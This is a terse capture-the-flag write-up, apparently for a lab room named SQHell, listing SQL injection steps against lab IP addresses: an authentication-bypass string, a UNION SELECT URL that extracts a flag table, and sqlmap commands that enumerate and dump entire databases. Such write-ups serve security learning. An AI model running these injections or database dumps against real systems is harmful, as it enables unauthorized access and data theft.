# - SQLHELL PLACE WRITEUP- #

> BEST QUOtE = ' OR '1'='1

1. flag 5 = http://10.10.159.183/post?id=3%20UNION%20SELECT%201,GROUP_CONCAT(flag),3,3%20FROM%20sqhell_5.flag

2. Login as admin 
- `sqlmap -u "http://10.10.159.183/login" --method=POST --data="username=admin&password=admin" -p "username,password" --risk=3 --level=3 --random-agent -D sqhell_2 --dump-all --threads 10`

3. Find more databases
- `sqlmap -u "http://10.10.159.183/register/user-check?username=admin2" -p "username" --risk=3 --level=3 --dbs --dbms=mysql --threads 10`
- `sqlmap -u "http://10.10.216.48/user?id=1" -p "id" --risk=3 --level=3 --dbs --threads 10`

4. Find 3 flag
- `sqlmap -u "http://10.10.159.183/register/user-check?username=admin" -p "username" --risk=3 --level=3 -D sqhell_3 --dump-all --dbms=mysql --threads 10`
- `sqlmap -u "http://10.10.159.183/post?id=2" -p "id" --risk=3 --level=3 -D sqhell_3 --dump-all --dbms=mysql --threads 10`

